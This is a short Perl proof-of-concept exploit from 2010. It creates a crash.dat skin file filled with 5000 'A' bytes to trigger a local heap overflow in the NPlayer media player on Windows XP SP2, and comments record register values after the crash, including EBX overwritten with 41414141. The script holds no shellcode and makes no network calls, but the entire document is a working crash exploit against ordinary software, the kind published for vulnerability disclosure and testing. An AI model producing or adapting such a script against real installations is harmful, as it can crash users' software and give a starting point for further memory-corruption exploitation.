#!/usr/bin/perl
#Exploit Title:NPlayer (.dat Skin File) Local Heap Overflow PoC
#Date:13/01/2010
#Author:Vulnerability Discovered By Rehan Ahmed (rehan@rewterz.com)
#Tested On: WinXP SP2
########################################################################################
##EBX 41414141
##ESP 0012EF6C
##EBP 00DA50F8 ASCII "C:\Program Files\n.player\skins\crash.dat"
##ESI 0012EFD8
##EDI 014143F8
##EIP 7C90EAF0 ntdll.7C90EAF0
#######################################################################################
########################################################################################
my $boom="\x41" x 5000;
my $file="crash.dat";
open($FILE,">$file");
print $FILE $boom;
close($FILE);
print "File Successfully Created\n";
########################################################################################